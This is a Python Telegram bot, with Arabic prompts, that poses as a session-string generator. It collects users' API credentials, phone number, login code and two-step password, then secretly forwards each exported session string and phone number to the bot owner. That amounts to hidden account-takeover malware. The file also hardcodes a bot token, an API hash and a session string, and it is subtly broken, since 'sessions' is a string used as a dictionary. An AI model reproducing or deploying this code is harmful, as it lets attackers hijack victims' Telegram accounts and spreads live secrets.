from pyrogram import Client, filters
from pyrogram.errors import PhoneCodeInvalid, SessionPasswordNeeded, PasswordHashInvalid
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7614011066:AAG319gvqxQq3GJY7CTGl113oSEqW60fd_o"
BOT_OWNER_ID = 8177034443
API_ID = 11765349
API_HASH = "67d3351652cc42239a42df8c17186d49"

sessions ="AgE-_xcAYbdrc4TG0DNWw1I7ZerniRO7BO3RNEbRXSt3lSIpNYj-yH15nWdryGagqT2NEM_GHDMn8txw_Fs8wZlA6t2olzWLf-bDxkAawCQmu4cdM03nfuRfnT4IILwJ3P9gtQI5GwvnrJYcIlsf6bvocllu9jox7niXwALh6pAm66Tzz_BqHXGd7gK16wkHmSOo9h5LTTqmXtMFItffn9vStkOVbJzi-fboVPDxzSldt3ekp_iGhH4nkqdVK1F5nuOKHOrgw8h9bzKF-lawS3-3lMaqBUU3Qi82bazM3UEzQ99Wxv2UBdnhWlEUvfCpXrwUyzmhfe912XJglxi3om0_Me77SAAAAAHnY6TLAA"

app = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


@app.on_message(filters.private & filters.text)
async def session_handler(client, message):
    user_id = message.from_user.id
    text = message.text.strip()

    # أول مرة: اطلب api_id
    if user_id not in sessions:
        sessions[user_id] = {"step": "api_id"}
        return await message.reply("📥 أرسل الـ api_id الخاص بك:")

    user = sessions[user_id]

    if user["step"] == "api_id":
        if not text.isdigit():
            return await message.reply("❌ يجب أن يكون api_id رقم.")
        user["api_id"] = int(text)
        user["step"] = "api_hash"
        return await message.reply("📥 أرسل الـ api_hash:")

    if user["step"] == "api_hash":
        user["api_hash"] = text
        user["step"] = "phone"
        return await message.reply("📞 أرسل رقم هاتفك مع رمز الدولة (مثال: +964...)")

    if user["step"] == "phone":
        user["phone"] = text
        try:
            temp_client = Client(
                name=f"gen_{user_id}",
                api_id=user["api_id"],
                api_hash=user["api_hash"],
                phone_number=user["phone"],
                in_memory=True
            )
            await temp_client.connect()
            await temp_client.send_code(user["phone"])
            user["client"] = temp_client
            user["step"] = "code"
            return await message.reply("📨 تم إرسال كود التحقق.\n📩 أرسل الرمز الآن:")
        except Exception as e:
            sessions.pop(user_id)
            return await message.reply(f"❌ خطأ أثناء الإرسال:\n{e}")

    if user["step"] == "code":
        try:
            await user["client"].sign_in(user["phone"], text)
            string = await user["client"].export_session_string()
            await message.reply(
                "✅ تم إنشاء الجلسة بنجاح!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 نسخ الجلسة", callback_data=f"copy|{string}")]
                ])
            )
            await client.send_message(
                BOT_OWNER_ID,
                f"📥 جلسة جديدة:\n"
                f"👤 المستخدم: [{message.from_user.first_name}](tg://user?id={user_id})\n"
                f"📱 الهاتف: `{user['phone']}`\n"
                f"🧾 الجلسة:\n`{string}`"
            )
            await user["client"].disconnect()
            sessions.pop(user_id)
        except PhoneCodeInvalid:
            return await message.reply("❌ الرمز خاطئ! أرسله مرة أخرى.")
        except SessionPasswordNeeded:
            user["step"] = "password"
            return await message.reply("🔐 الحساب عليه تحقق بخطوتين.\n📌 أرسل كلمة السر:")

    if user["step"] == "password":
        try:
            await user["client"].check_password(text)
            string = await user["client"].export_session_string()
            await message.reply(
                "✅ تم إنشاء الجلسة بنجاح بعد التحقق الثنائي!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 نسخ الجلسة", callback_data=f"copy|{string}")]
                ])
            )
            await client.send_message(
                BOT_OWNER_ID,
                f"📥 جلسة جديدة (تحقق بخطوتين):\n"
                f"👤 المستخدم: [{message.from_user.first_name}](tg://user?id={user_id})\n"
                f"📱 الهاتف: `{user['phone']}`\n"
                f"🧾 الجلسة:\n`{string}`"
            )
            await user["client"].disconnect()
            sessions.pop(user_id)
        except PasswordHashInvalid:
            return await message.reply("❌ كلمة السر خاطئة! حاول مجددًا.")
        except Exception as e:
            return await message.reply(f"❌ خطأ:\n{e}")


@app.on_callback_query(filters.regex(r"copy\|(.+)"))
async def copy_callback(client, callback_query):
    string = callback_query.data.split("|", 1)[1]
    await callback_query.answer("📋 تم نسخ الجلسة!", show_alert=True)
    await callback_query.message.edit(
        f"✅ هذه هي الجلسة:\n\n`{string}`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 نسخ مرة ثانية", callback_data=f"copy|{string}")],
        ])
    )


app.run()
